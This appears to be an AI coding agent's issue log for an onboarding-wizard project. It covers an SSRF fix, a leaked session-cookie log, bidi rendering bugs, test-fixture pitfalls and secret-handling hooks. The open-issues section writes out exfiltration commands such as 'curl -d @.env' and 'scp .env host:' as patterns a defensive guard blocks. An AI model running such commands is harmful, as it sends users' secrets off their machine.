## Hebrew instructions chaining multiple embedded English UI terms with an arrow read ambiguously — root cause required direct on-screen measurement, not visual inspection

- **When:** 2026-09-08, reported by the user: Hebrew instructions like "Account Settings ← API Keys" made a screenshot look like the flow was "go to API Keys, then find Account Settings" — backward from the intended navigation order.
- **What happened:** Several Hebrew strings embedded multiple untranslated English UI labels chained by an arrow directly inline in RTL prose (2-5 terms per chain, across 7 strings). My first fix attempt added Unicode isolate characters (LRI/PDI) around each term and flipped the arrow from ← to →, reasoning that isolation was the more spec-correct, cross-renderer-consistent choice and that → matched the terms' logical source-string order. This shipped an internally-inconsistent state and was caught by re-verification, not by getting it right the first time: measuring each term's actual on-screen X position via `getBoundingClientRect()` (not eyeballing a screenshot, which is exactly what's error-prone for bidi text) showed that **isolating multiple embedded LTR runs reverses their visual order relative to each other** — the arrow direction that reads correctly is the *opposite* of what source-string order suggests, and I had it backward. A controlled standalone test page (4 combinations: isolated/not × →/←) was required to nail this down conclusively before trusting any fix.
- **Cost:** No user-facing regression shipped (caught via direct measurement before commit), but two full fix-and-verify cycles were spent on an approach ultimately discarded in favor of a structurally different one (real nested `<ol>` lists) once the user pointed out that matching arrow direction to isolation behavior is inherently fragile and asked for a non-directional alternative.
- **Fix:** Every affected string's Hebrew translation is now a real nested `<ol>`/`<li>` list (one term per list item, read top-to-bottom) instead of an inline arrow chain — this sidesteps the whole bug class structurally rather than depending on correctly-matched arrow semantics. Rendered via a new `HTML_I18N_KEYS`-gated `innerHTML` path in `applyLanguage()` (every other translation keeps using `textContent`, the safe default). English strings are untouched — they never had this problem. See `CLAUDE.md`'s dedicated section for the full mechanism and the one deliberate exception (`err_uptime_unauthorized`, reworded to avoid the arrow chain entirely rather than special-casing the shared error-rendering path for one key).
- **Suggested CLAUDE.md change:** Already folded in — see the new "Hebrew strings never chain multiple embedded LTR terms with an arrow" section. Worth generalizing further for future i18n work in this project: **bidi/RTL layout claims must be verified by measuring actual rendered positions (`getBoundingClientRect()`, a controlled standalone test page varying one variable at a time) before trusting a fix, never by reading a screenshot's text as if it were a plain string** — reading bidi text visually is exactly the skill that's unreliable here, for a human and a model alike.

## A requested security + code review of the whole onboarding wizard found a real SSRF vulnerability in the Vertex credential frame, plus 9 correctness bugs — all fixed in one pass

- **When:** 2026-08-28, user-requested "a set of reviews of the entire onboarding app" — a `security-review`-skill pass and a `code-review`-skill pass (high effort), run in parallel, independently of the task-scoped reviews that already passed each sub-project.
- **What happened:** The security review found a HIGH-severity SSRF in `llm_client.py::list_vertex_models` (sub-project 4): a visitor-supplied GCP service-account JSON's `token_uri`/`universe_domain` fields were passed unvalidated into `google.oauth2.service_account.Credentials.from_service_account_info()`, letting an unauthenticated visitor redirect this server's own outbound token-refresh request to an arbitrary host. Fixed by pinning both fields to Google's real values before credentials are ever constructed — see `CLAUDE.md`'s sub-project 4 section and the accompanying tests/regression coverage for the guard itself. The code review separately found and fixed 9 more correctness bugs across the GitHub App, Supabase, and UptimeRobot frames (stale-completion flags, missing generation tokens on poll loops, unpaginated dedupe scans, missing error states) — each fix has its own regression test; full blow-by-blow dropped here per this file's pruning convention (`git log -p -- ISSUES.md` has it).
- **Cost:** None net-negative — caught by a review the user asked for proactively, not by an exploit. But the near-miss is real: a real, shippable bug survived every task-scoped review for one sub-project and was only caught by a later, broader pass — the first such instance to be an actual security vulnerability rather than a correctness bug.
- **Suggested CLAUDE.md change:** Worth generalizing explicitly: **a credential-accepting endpoint that constructs an auth/HTTP client object from a visitor-supplied structured value (JSON, a config blob) needs a specific SSRF-focused check during its own design/review — does any field in that structure influence which host a server-side request is made to? — not just the "returns a verdict, never the credential" review this project already does well.** That specific class of gap (a "paste your service-account JSON" feature routing internal fields into a client library that reads them for connection-destination purposes) is exactly the shape a task-scoped review focused on credential *handling* (never logged, never echoed) can miss, because the vulnerable field isn't the credential itself — it's inert-looking routing metadata sitting right next to it in the same JSON blob. This generalized principle was never folded into `CLAUDE.md` as a standing rule — worth doing if a similar frame is ever added.
- **Update (2026-09-06):** folded into `CLAUDE.md` — see the "Plan-execution / multi-agent process hygiene" section's new SSRF-focused design-review rule, added alongside a tightening of the neighboring "task-scoped review checks conformance" bullet to trigger an immediate per-task `code-review` pass for this class of code, rather than deferring to final review.

## A user-requested review of the slot_config/env-var-DB rework found the session cookie itself being logged verbatim in `supabase_client.py`

- **When:** 2026-09-09, user-requested code-correctness review (Opus, single subagent, no sub-spawning) of the whole project, focused on the slot_config/env-var-DB rework (commit 9de5f04) and cross-checked against `~/pr-review-bot`'s actual source.
- **What happened:** `supabase_client.get_connection_info`'s two diagnostic `print()` calls logged the `onboarding_session` cookie value verbatim (`print(f"[DEBUG connection-info session={session_id}] ...")`), while the function's own docstring asserted the opposite — that `session_id` was "used only to tag the diagnostic prints ... never logged or sent anywhere itself. It's not a credential." Both halves were wrong: it was logged, and it *is* the sole authenticator for every relay endpoint in `router.py` (session-cookie auth, no separate token). A leaked application log line containing this value would let an attacker call `create-service` with an attacker-controlled `repo_url`, then `bulk-push-env-vars` and `trigger-deploy` — pushing the visitor's Render/GitHub/Supabase/LLM/dashboard credentials into a service built from the attacker's own Dockerfile. Present since the file's initial import (predates the reviewed rework).
- **Cost:** No known exploitation — caught by a proactively-requested review, not an incident. Fixed same-session: both `print()` calls replaced with `logger.info(...)` (new `logger = logging.getLogger(__name__)`) tagging log lines with `_log_session_tag(session_id)` — a `hashlib.sha256(...).hexdigest()[:8]` one-way correlation tag — instead of the raw cookie; the docstring corrected to state plainly that `session_id` is a credential.
- **Suggested CLAUDE.md change:** None needed beyond what's already there — this is exactly the class of leak the existing "never log a visitor-supplied credential" and "never dump ... " secret-handling rules already cover; the gap was a docstring asserting the code did the safe thing when it didn't, which a review that reads the docstring and trusts it (rather than the actual `print` call) would miss. Worth remembering for future reviews of this file: verify a "this is safe, see reasoning below" comment against the code it's describing, not just against the code around it.

## GitHub's push protection flagged a Stripe-shaped string in git history before the first push — a known, intentional fake fixture value, not a real credential, but still worth a content-level scan going forward

- **When:** 2026-09-05, first `git push` of this newly-split repo to its own GitHub remote (`SomeoneSomewhereelse/onboarding-wizard`), immediately after the monorepo-to-standalone-repo restructure was merged to `main`.
- **What happened:** The restructure's baseline commit (created to bring this repo's ~305 untracked files under version control for the first time — see the restructure's own design/plan docs) included several old `bot`-project audit/findings documents (`docs/2026-08-05-first-hosted-run-findings.md`, `docs/2026-08-11-full-project-review-security-performance-quality.md`, `docs/superpowers/plans/2026-08-11-audit-fix-round.md`, `docs/superpowers/specs/2026-08-11-audit-fix-round-design.md`) whose prose quoted a Stripe-shaped placeholder string. **This was never a real, live Stripe credential.** The string originated from `bot/fixtures/bad_code/billing_report.py` — a deliberately planted, intentionally-bad fixture used to give `bot`'s own AI code-review "Security specialist" something obvious to catch during demos/tests (seeded via `scripts/seed_demo_pr.py`). A 2026-08-11 security review in `bot`'s own history had already flagged that the fixture's placeholder was shaped too realistically (risking exactly this GitHub scanner trip) and replaced it with an unambiguous value (`"FAKE-DEMO-KEY-fA6bC0dE4gH-DO-NOT-ROTATE"`) in the fixture code itself — but the *old prose documents describing that finding* still quoted the original Stripe-shaped placeholder, and those documents (not the fixture code, which was already fixed) are what got swept into this repo's baseline commit and tripped GitHub's push protection again.
- **Initial response, corrected:** Treated the flagged string as a real, live credential on first discovery (reasonable given GitHub's scanner had no way to know it was synthetic) and advised the user to rotate it. The user pointed out they'd never used the flagged service, which prompted checking the actual surrounding context in the (already-redacted) git history — at which point the fixture/demo-fixture origin became clear. **Correction:** nothing needs rotating; no real account or credential was ever involved. Lesson: before advising "treat this as compromised, rotate now," check what the flagged content actually *is* (read the surrounding context, which is safe once the exact value itself is structurally redacted) rather than reacting to the scanner's pattern match alone — a synthetic security-testing fixture that intentionally mimics a real credential's shape is a real, if narrow, class of false positive this project's own history had already produced once before.
- **Cost:** None — no real secret was ever involved, and the value never left this machine regardless. Some unnecessary work (a git-history rewrite, in hindsight not required) and a wrong initial rotate-the-key recommendation to the user, corrected once actual context was checked.
- **Fix:** Rewrote local git history with `git filter-repo --replace-text` (via `uv tool run git-filter-repo`, since the repo had never been pushed anywhere yet, making history rewrite safe/low-cost) using structural regex patterns for Stripe's known key-prefix shapes (`sk_live_`/`sk_test_`/`rk_live_`/`rk_test_`/`pk_live_`/`pk_test_`/`whsec_`) — the actual string was never read, viewed, or printed at any point during the fix itself. Force-pushed the rewritten history, then deleted the local backup tag and ran `git gc --prune=now --aggressive`. This was ultimately more thorough than strictly necessary once the fixture origin was confirmed, but harmless — the repo's history is clean either way.
- **Suggested CLAUDE.md change:** A bulk first-commit of a large pre-existing tree (bringing previously-untracked files under version control, or importing a directory from elsewhere) benefits from a content-level secret scan — not just a filename-based one — before that commit is created, not just before every push thereafter. A filename check (`.env`, `*.pem`, known service-account JSON names) only catches secrets that live in files whose *names* signal them; a credential-shaped string pasted inline into a prose document (an incident writeup, an audit finding, a demo fixture's own description) has no such signal. Separately: when a scanner (GitHub's push protection or otherwise) flags a credential-shaped string, check what it actually is — read the surrounding context once the value itself is safely handled — before asserting "treat as compromised, rotate now" to the user; a real deliberately-fake security-testing fixture is a known false-positive shape in this project's own history, not a hypothetical.
- **Follow-up (same day):** The user separately noted that `bot`/`dashboard`/`guide` content (including this fixture and the docs that quoted it) had no reason to exist in this repo's git history at all, even though the restructure had already removed it from the current tree in later commits. Re-ran `git filter-repo --invert-paths` (again via `uv tool run git-filter-repo`) with an explicit path list covering every `bot/`, `dashboard/`, `guide/` file, `mkdocs.yml`, the two dead `.claude/commands/*.md` slash commands, `tests/test_setup_command.py`, and all 81 bot-project-only spec/plan/handoff docs the restructure's own Task 5 had pruned from the tree — removing them from every commit, not just the tree at `HEAD`. This incidentally also fully removed the four docs this entry is about (rather than leaving a redacted placeholder in them), since their paths were on the same removal list. Verified zero remaining reachable paths under any of the removed prefixes via `git log --all --diff-filter=A --name-only`, full test suite (452 passed) and `ruff check .` unaffected (removed paths were already absent from the working tree), then force-pushed again and repeated the local backup-tag-delete + `git gc --prune=now --aggressive` cleanup. This repo's history now only ever shows onboarding-wizard content, matching the restructure's original intent that this be a genuinely standalone repo.

## A session-scoped Playwright sync-API fixture broke unrelated async tests in the same worker process

- **When:** 2026-09-06, implementing `docs/superpowers/plans/2026-09-06-onboarding-browser-tests.md` Task 1 (real browser-behavior test fixtures).
- **What happened:** Running the new browser test file together with `tests/test_onboarding_page.py` deterministically (not flaky) failed an unrelated async test with `RuntimeError: Runner.run() cannot be called from a running event loop`. Root cause, confirmed by direct repro before being treated as real: Playwright's sync API (`playwright.sync_api.sync_playwright()`) marks an event loop as "running" on the calling thread for as long as its context stays open — even with no browser launched yet. A session-scoped `browser` fixture held that context open for the whole test session, which broke every *other* `pytest-asyncio` async test that ran afterward in the same xdist worker process. The full suite happened to pass regardless (xdist's scheduling never put the affected test in the same worker as the browser test), which would have let this ship unnoticed if the plan's own verification step hadn't specifically run the two files together.
- **Cost:** None shipped — caught during the same implementation pass, before the commit. Some rework: the fixture, the spec (`docs/superpowers/specs/2026-09-06-onboarding-browser-tests-design.md` section 3), and the plan all needed a correction pass.
- **Fix:** Made `browser` function-scoped instead of session-scoped — Chromium is launched and the `sync_playwright()` context fully closed within each single test, so the "running loop" leak is transient and invisible to every other test. Verified by running the two affected files together three times in a row (not just the full suite once) to rule out scheduling-dependent flakiness.
- **Suggested CLAUDE.md change:** Worth a general note for any future Playwright-sync-API fixture in this project: **never make it session/module-scoped in a suite that also runs `pytest-asyncio` async tests** — the "running loop" side effect is scoped to however long the `sync_playwright()` context stays open, not to whether a browser is actually doing anything, and running the full suite is not sufficient to catch this (xdist's worker scheduling can hide it by accident). When verifying a fix like this, deliberately run the specific combination of files/tests suspected of interacting, not just the full suite.

## Browser tests of a locked frame need the real unlock mechanism, not a direct `.open`/display toggle

- **When:** 2026-09-06, implementing Tasks 2 and 3 of `docs/superpowers/plans/2026-09-06-onboarding-browser-tests.md`.
- **What happened:** Both new browser tests (the UptimeRobot blocked-state test, then the Supabase restore-from-session test) initially failed with the target element never becoming visible, even though the code under test was correct and its `display` style was already right. Root cause, the same underlying mechanism in both cases: every wizard frame's `<details>` starts `data-locked="true"`/closed, and `guardLockedFrames()`'s `toggle` event listener immediately re-closes any frame whose `dataset.locked` is still `"true"` the instant something sets `.open = true` — a native closed `<details>` renders no content at all regardless of any inner element's own `display` style, so `page.is_visible()`/`wait_for_selector(state="visible")` on anything inside it is always false until the frame is genuinely unlocked the way production code does it (`dataset.locked = "false"` *before* `.open = true`, which is what `unlockFrame()` does but `showSupabaseProvisioning()` does not).
- **Cost:** None shipped — both caught immediately by the test itself failing, diagnosed via `page.eval_on_selector`/`page.is_visible` before being treated as a real bug rather than assumed-flaky.
- **Fix:** Task 2's test calls the real `unlockFrame('uptime-pinger')` instead of only the narrower `refreshUptimePingerBlockedState()`. Task 3's test (whose flow never calls `unlockFrame` itself — `showSupabaseProvisioning()` sets `.open` directly) uses `page.add_init_script()` to pre-set `dataset.locked = 'false'` before the page's own `DOMContentLoaded` listener runs, reproducing the real precondition (a visitor only ever reaches this restore path for a frame they already unlocked) rather than fighting the guard.
- **Suggested CLAUDE.md change:** Worth a general note for future browser tests in this project: **a frame's `<details>` being closed can silently mask a passing assertion as a failing one (or vice versa) — always ensure the frame under test is genuinely unlocked (via the real `unlockFrame()`/equivalent code path, or a pre-navigation init script) before asserting on the visibility of anything inside it,** rather than assuming a `display` style check alone is sufficient.

## "Start over" doesn't clear sessionStorage — a redone wizard's last frame stays locked with a stale error

- **When:** 2026-09-07, reported live by the user after confirming the `dockerfilePath` fix above: after "Start over" on a wizard run that had reached "Finish & Deploy" with a failed deploy, redoing every frame left the final frame permanently stuck locked, badged "error", with no way to reach it short of a page refresh. A related symptom reported in the same message: the frame appeared to sit on "deploying" indefinitely.
- **Root cause:** `resetWizard()` deletes the server-side session and calls `location.reload()`, but a same-tab reload leaves `sessionStorage` completely untouched. A prior run's `onboarding.renderService` blob (in particular `pending_deploy_id`, written once a deploy is triggered, or left over from a failed one) survives into the "fresh" session. `restoreFromSession()` reads that blob directly — deploy progress was deliberately kept out of `GET /api/session` (see this repo's own design docs) since it's tracked live via polling, not "restorable" as instantly done — and on seeing the leftover `pending_deploy_id`, fires a background poll against `/api/render/deploy-status` before the visitor has redone a single frame. The fresh session has no matching server-side deploy record, so the poll resolves `no_session`, which sets the still-locked render-deploy frame's `frameState.status` to `"error"` (briefly showing `"deploying"` first, hence the second symptom) via a fire-and-forget async call that resolves *after* `restoreFromSession()`'s own synchronous frame-restore chain has already run. Once poisoned to `"error"`, `completeFrame`'s own "unlock next frame" check (`frameState[next].status === "locked"`) never matches again for the rest of that browsing session, no matter how many times the visitor legitimately finishes redoing every prior frame. A page refresh "fixes" it only because, on that reload, `GET /api/session` now reports every frame done, so the synchronous unlock chain runs and genuinely unlocks the frame *before* the same stale-flag poll fires again and re-poisons the badge.
- **Cost:** None external — caught by the user's own testing before being reported as a bug, root-caused and reproduced live via Playwright (a raw reload with a seeded stale `pending_deploy_id`, then simulating a full frame redo in the same page) before any fix was attempted, confirming the exact mechanism rather than guessing.
- **Fix:** `resetWizard()` now also clears every `STORAGE_KEYS` entry and `RENDER_SERVICE_URL_KEY` from `sessionStorage` before reloading — a "Start over" is a genuinely clean slate on both the server and the client, not just the server. Regression test (`test_reset_wizard_clears_session_storage_before_reloading`) pins both clears running before `location.reload()`.
- **Suggested CLAUDE.md change:** Worth a general note: **any "reset"/"start over" affordance that relies on `location.reload()` to establish a clean client state must explicitly clear every piece of its own client-side storage first** — a same-tab reload does not clear `sessionStorage` (only closing the tab/window does), so any code path that treats a fresh reload as equivalent to a brand-new visitor (as `restoreFromSession()`'s `sessionStorage`-backed render-deploy resumption logic implicitly does) is a latent trap for exactly this class of bug.

## Wizard-created Render services failed every build — stale `dockerfilePath` left over from the sibling repo's own restructure

- **When:** 2026-09-07. The user granted temporary read access to their own Render account (a token in `~/render_token`, never displayed — read only into a shell variable, never as a literal command-line argument) to investigate a failed deploy of a wizard-provisioned `pr-review-bot` service.

The sibling `pr-review-bot` repo's `bot/` directory was flattened up to its own root on 2026-09-05 (commit `b0a8025`, "flatten bot/ to repo root") as part of that repo's own standalone-repo restructure — its Dockerfile has lived at `./Dockerfile` ever since, and `bot/Dockerfile` no longer exists at `HEAD` at all (confirmed via `git cat-file -e`). That restructure's design doc is scoped entirely to the `pr-review-bot` repo and updated *that* repo's own `render.yaml` accordingly, but never mentioned the cross-repo dependency — nobody updated this wizard's hardcoded value to match. Every service the wizard has created since 2026-09-05 has pointed Render at a Dockerfile path that no longer exists, so it fails instantly on every build attempt.
- **Compounding factor:** a 2026-09-05 "stale-path sweep" fix wave in this repo explicitly checked this exact line and "confirmed correct and left untouched" (see the "Repo-wide stale-path sweep" entry above) — but that check ran *after* the sibling repo's flatten had already landed, so the line was already stale at the moment it was confirmed. The check evidently trusted the line's own comment/history rather than cross-referencing the sibling repo's actual current tree.
- **Cost:** Every wizard-provisioned service between 2026-09-05 and this fix's discovery was broken at the final step — a visitor could complete the entire wizard and never get a working deployment, with no error surfaced by the wizard itself (the deploy *triggers* successfully; it only fails afterward, purely on Render's side, which `deploy-status` polling does report, but nothing in this project's own test suite would have caught the wrong path since no test ever asserted the actual payload value).
- **Fix:** `dockerfilePath` corrected to `./Dockerfile`; added `test_create_service_dockerfile_path_matches_sibling_repos_flat_layout` (`tests/test_onboarding_render_client.py`) asserting the actual outgoing request payload, closing the gap that let this ship unnoticed. Full suite, `ruff`, and `deploy-verify` all green; not independently re-verified against a live Render deploy (would cost the visitor's own Render/GitHub quota for no diagnostic gain beyond what the payload-level test already proves).
- **Suggested CLAUDE.md change:** Worth generalizing: **when this wizard's `render_client.py` hardcodes a fact about the sibling `pr-review-bot` repo's own layout (a file path, a directory structure), a "confirm this is still correct" check must actually diff against that repo's current tree (e.g. `git -C ~/pr-review-bot cat-file -e HEAD:<path>`), not just re-read this repo's own code/comments and trust them** — the whole point of the check is to catch drift *between* the two repos, and trusting one side's own stale claim about the other side defeats it. Also worth a standing regression-test convention: **any hardcoded request payload sent to an external service on this project's behalf should have at least one test asserting the actual outgoing payload value, not just the response-handling branch** — this bug shipped for two days because every existing `create_service` test only exercised response parsing, never the request being sent.

## `check_env_access.py` silently drifted from the sibling repo's 2026-09-12 worktree fix

- **When:** Discovered 2026-09-13, during the exfiltration-guard implementation's cross-repo scoping pass. **Closed 2026-09-13**, same day, on the user's direct instruction to port the fix.
- **What happened:** `~/pr-review-bot/.claude/hooks/check_env_access.py` was rewritten on 2026-09-12 to fix a real usability bug: the harness's `EnterWorktree` isolation guard refuses any command naming `git` unless it is a *plain single command*, and the wrapper's pre-fix, pipe-based redaction shape could never satisfy that (redaction needs at minimum a redirect and a second statement) — so every Bash call inside an `EnterWorktree` session in that repo was refused, `git status` included. - **Cost:** No incident occurred — this wizard's sessions never used `EnterWorktree` between the sibling repo's fix landing and this one. Recorded so the drift was known rather than silently inherited, per the same "hand-maintained copies drift with nothing mechanical to catch it" problem the exfiltration-guard design was built around.
- **Fix:** Ported `_wrap_bash`'s subshell/file-fed rewrite verbatim from `pr-review-bot`'s `56fca18`, plus the 3 new integration tests and the corresponding `test_check_env_access_hook.py` updates. One deliberate, documented byte-for-byte difference from the sibling copy: `_SINK_DIR` reads `~/.cache/onboarding-wizard-redact` here instead of `~/.cache/pr-review-bot-redact` (the name `check_exfiltration.py`'s `_PROTECTED` list already reserved for it) — see `_SINK_DIR`'s own comment. Full suite and `ruff` green; `diff` against the sibling copy shows only the two hunks that one-line difference implies.
- **Suggested CLAUDE.md change:** Made — see the "Workspace isolation: worktree vs inline" section (its "still pipes"/"superseded pipe-based wrapper" language updated now that the fix has landed) and the "`.claude/hooks/` files are shared with the sibling repo" rule in `## Conventions` (now notes the one documented exception for `check_env_access.py`'s sink-directory name).

- **Found during:** Final review, `docs/superpowers/plans/2026-09-12-wizard-vertex-project-location-and-early-model-probe.md` (spec section 8, logged as part of that work per its own instruction).
- **What:** A failed re-submit via "Change" leaves the previously confirmed provider/model/pair in the session while the UI shows the frame errored. Concretely, a visitor who first confirms vertex (writing `vertex_gcp_project`/`vertex_gcp_location`) and then redoes the frame as gemini/groq leaves those two fields sitting in the same frame dict alongside the new provider's fields — `bulk_push_render_env_vars` now guards against seeding them onto the wrong provider's `slot_config` row (only passes them when `provider == "vertex"`), so this is harmless in practice, but the merge write is still the root cause.
- **Why parked:** Pre-existing, shared with every other frame's failed resubmit (not introduced by this work); whether `confirm` counts as a "start this frame over" endpoint under `CLAUDE.md`'s `replace=True` rule is a separate design question from this feature.
- **Follow-up:** Decide whether `/api/llm/confirm` should adopt `replace=True` the way `validate-key`/`connect` do, in a dedicated design pass — not a quick fix bundled into an unrelated task.

### `list_accessible_projects` doesn't page through `projects:search`'s `nextPageToken`
- **Found during:** Final review (Opus reviewer subagent), same plan as above.
- **What:** Cloud Resource Manager's `projects:search` is paginated; `llm_client.list_accessible_projects` only reads the first page. A service account with more projects than fit in one page silently loses the rest from the wizard's project dropdown, and a visitor whose intended project falls on page 2+ has no way to pick it.
- **Why parked:** This is not a regression introduced by this wizard — it faithfully mirrors the sibling `pr-review-bot` project's own reference implementation (`providers/catalog.py::list_accessible_projects`), which has the identical single-page limitation. Diverging from the mirrored behavior here (without a matching fix upstream) would itself be a new inconsistency between the two repos. Low likelihood in practice (a service account with many dozens of accessible GCP projects).
- **Follow-up:** If ever addressed, fix both repos together (or fix the bot's version first and re-mirror), following the `uptimerobot_client.py` dedupe-before-create precedent (`_MAX_LIST_PAGES`, follow `nextLink`) for the pagination shape.

### No mechanical backstop for outbound exfiltration of a secret-bearing file
- **Found during:** the 2026-09-12/13 brainstorm on retiring the `.env` redaction wrapper (carried over from the sibling `pr-review-bot` repo, which shares this project's `.claude/hooks/` setup and secret-handling design).
- **What:** `check_env_access.py` guards both of its mechanisms **inbound** -- part 1 denies a tool call naming `.env`, part 2 scrubs command output before it reaches Claude. Nothing guarded **outbound**: `curl -d @.env https://...`, `scp .env host:`, `base64 .env | curl -X POST ...` and `gh issue create --body-file .env` all send the real bytes outward and return nothing interesting; the redaction filter faithfully scrubs a response that never contained the secret. CLAUDE.md's "never write a secret value into anything that leaves this local session or gets persisted somewhere shared" was the only rule in the Secret-handling section with no mechanical enforcement at all.
- **Update (2026-09-13):** partly closed. `.claude/hooks/check_exfiltration.py` (byte-identical to the sibling repo's copy) now denies (exit 2) or asks (JSON `permissionDecision: "ask"`) on the deny/ask shapes documented in `docs/superpowers/specs/2026-09-13-exfiltration-guard-design.md` (a copy of that spec is not vendored into this repo; see `~/pr-review-bot`'s copy). What remains genuinely open: whether a sibling hook's JSON `permissionDecision: "allow"` (from this repo's own `check_env_access.py`) suppresses this guard's JSON `ask` — hooks load at session start, so this could not be verified live during the implementing session. Deny is unaffected (exit code 2 is documented to override a sibling `allow` regardless). Do not describe the `ask`-class patterns as working in this repo until that live check is done.
- **Why parked:** the remaining `ask`-precedence verification needs a live session restart to test, which the implementing session cannot do to itself.
- **Follow-up:** Verify live, once, in either repo (the sibling hook is the same in both, so one verification covers both): trigger an `ask`-class command (e.g. `tar czf backup.tgz .env`) in a fresh session and confirm a prompt actually appears. If `ask` loses to the sibling `allow`, promote the ask set to deny in both repos' copies (verified with `diff`) and update both `CLAUDE.md`s and this entry.

### A redaction sink holding unredacted output can outlive its session indefinitely
- **Found during:** the same brainstorm (carried over from the sibling repo for the same reason as above).
- **What:** `check_env_access.py`'s `_sink_path()` creates a 0600 file per Bash call holding that command's full unredacted combined stdout+stderr until the wrapped command's own `rm -f` deletes it, with a piggybacked sweep (`_sweep_sinks()`, on the next Bash call) as backstop for the abnormal path. A sink younger than its max age when a session ends survives until some future session runs a shell command in this project -- which may be never.
- **Now applicable (2026-09-13):** This repo's `check_env_access.py` ported the sibling repo's 2026-09-12 file-fed rewrite the same day (see the "silently drifted" incident entry above, now closed) — the wizard's own sink directory (`~/.cache/onboarding-wizard-redact/`) is live as of this port, so this gap now applies here exactly as it does in `pr-review-bot`.
- **Status:** open, same as the sibling repo's copy of this issue — no `SessionEnd` sweep exists in either repo yet.
- **Follow-up:** Evaluate a `SessionEnd` hook sweeping the directory unconditionally, in step with whatever `pr-review-bot` settles on for its own copy (the two should stay in sync, same as the rest of these hook files).
